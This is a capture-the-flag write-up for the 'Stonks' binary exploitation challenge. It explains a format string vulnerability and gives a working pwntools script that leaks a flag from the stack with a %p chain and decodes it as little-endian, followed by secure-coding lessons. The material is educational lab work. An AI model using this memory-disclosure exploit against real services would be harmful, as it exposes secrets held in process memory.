# CyLab / picoCTF — Stonks

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn / Format String)  
* **Difficulty:** Easy (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 32-bit ELF provided with source code `vuln.c`  

---

## TL;DR

A classic and clean introduction to **Format String Vulnerabilities**. The target application simulates an algorithmic stock trading bot. Inside `buy_stonks()`, the program reads an API token/flag from disk into a local stack buffer (`char api_buf[128]`), then passes user-supplied stock input directly to `printf(user_buf)` without a format specifier. By submitting a format string consisting of repeated `%p` specifiers, we force `printf` to walk upwards along the call stack and leak raw 32-bit memory words. Extracting these hexadecimal tokens and decoding them from little-endian byte order recovers the plaintext flag directly from memory without requiring any control flow hijacking.

---

## Recon

We inspect the binary's properties and compiler mitigations using `file` and `checksec`:

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, not stripped

$ checksec vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
* **File Type:** ELF 32-bit LSB (x86), dynamically linked, not stripped.
* **Canary & NX:** Enabled, but irrelevant because format string memory disclosure reads stack contents passively without corrupting memory or hijacking execution flow.
* **Source Available:** The challenge includes `vuln.c`, allowing direct line-by-line inspection of memory structures.

---

## Static Analysis & Vulnerability

### 1. Code Review (`vuln.c`)

Inspecting `buy_stonks()` in `vuln.c`:

```c
int buy_stonks(Portfolio *p) {
    char api_buf[FLAG_BUFFER];            // 128 bytes on the stack
    FILE *f = fopen("api","r");
    if (!f) {
        printf("Flag file not found.\n");
        exit(1);
    }
    fgets(api_buf, FLAG_BUFFER, f);       // Flag read into local stack buffer!
    ...
    char *user_buf = malloc(300 + 1);
    printf("What is your API token?\n");
    scanf("%300s", user_buf);

    printf(user_buf);                     // <-- FORMAT STRING VULNERABILITY!
    view_portfolio(p);
}
```

### 2. Disassembly & Vulnerability Root Cause

1. In C, `printf(const char *format, ...)` expects the first argument to be a static format string.
2. The program directly passes `user_buf` to `printf(user_buf)` without `%s`.
3. When `printf` parses a format specifier such as `%p` or `%x`, it expects the corresponding argument to have been pushed onto the stack (or passed via registers).
4. Because no variadic arguments were actually passed by the caller, `printf` blindly pops values from the caller's stack frame, treating whatever happens to reside there as formatting arguments.

### 3. Stack Memory Layout

Because `api_buf` is a local variable declared in `buy_stonks()`, it resides directly above the stack frame created for `printf()`:

```text
  Lower Memory Addresses
  +-----------------------------------+  <- printf stack frame
  | printf internal state             |
  +-----------------------------------+  <- buy_stonks stack frame (Variadic read zone)
  | Saved registers & local pointers  |
  +-----------------------------------+
  | api_buf[128] (Contains FLAG!)     |  <- Dumped sequentially by %p chain!
  +-----------------------------------+
  | Saved EBP / Return Address        |
  +-----------------------------------+
  Higher Memory Addresses
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. Memory Disclosure via `%p` Chain
By sending a repeating delimiter sequence such as `b".".join([b"%p"] * 120)`:
* `printf` prints over 100 consecutive 32-bit/64-bit words from the stack as hexadecimal pointers (`0x64616361.0x7b796d65...`).
* `(nil)` represents a word containing `0x00000000`.

### 2. Little-Endian Byte Order Unpacking
x86 architectures use little-endian byte ordering, meaning the least significant byte is stored at the lowest memory address:
```text
Hex Word:    0x64616361  ->  ASCII bytes: 'a', 'c', 'a', 'd' ("acad")
Hex Word:    0x7b796d65  ->  ASCII bytes: 'e', 'm', 'y', '{' ("emy{")
Hex Word:    0x306c5f49  ->  ASCII bytes: 'I', '_', 'l', '0' ("I_l0")
```
To reconstruct the flag:
1. Extract all hexadecimal values matching the regex `0x[0-9a-f]+`.
2. Convert each 4-byte/8-byte integer back into raw bytes using little-endian byte order (`int(w, 16).to_bytes(4, "little")`).
3. Concatenate all bytes and apply regex matching `[A-Za-z0-9_]{3,}\{[ -~]+\}` to isolate the flag string.

---

## Exploit

We construct the automated exploit in Python:

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — Stonks
Exploit: Format string stack memory disclosure & Little-Endian byte extraction
"""

from pwn import *
import re

context.log_level = 'info'

HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 105)

def main():
    p = remote(HOST, PORT)

    # 1. Select Option 1 (Buy some stonks!)
    p.recvuntil(b"2) View my portfolio\n")
    p.sendline(b"1")

    # 2. Transmit format string leak chain
    p.recvuntil(b"What is your API token?\n")
    payload = b".".join([b"%p"] * 120)
    p.sendline(payload)

    # 3. Receive all stack dump output
    data = p.recvall(timeout=5)

    # 4. Extract hex words, decode little-endian bytes, and locate flag
    hex_tokens = re.findall(rb"0x[0-9a-f]+", data)
    raw_bytes = b"".join(int(w, 16).to_bytes(4, "little") for w in hex_tokens)

    flag_match = re.search(rb"[A-Za-z0-9_]{3,}\{[ -~]+\}", raw_bytes)
    if flag_match:
        log.success(f"Flag Recovered: {flag_match.group(0).decode()}")
    else:
        log.error("Flag string not found in leaked memory.")

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the script extracts the memory words and decodes the flag:

```text
[+] Opening connection to xebec.cylabacademy.net on port 105: Done
[+] Flag Recovered: academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Avoid Unsanitized Format Strings**: Calling `printf(user_input)` without an explicit format specifier allows attackers to read and write arbitrary process memory. Always use `printf("%s", user_input)`.
2. **Stack Secret Exposure**: Secrets stored in local stack buffers (such as API tokens, session keys, or uninitialized buffers) can be read passively with `%p` or `%x` chains without triggering crashes or detection.
3. **Little-Endian Word Representation**: Stack memory on x86/x64 systems stores multi-byte values in little-endian order. Extracted integer words must be unpacked in reverse byte order to reconstruct readable ASCII strings.
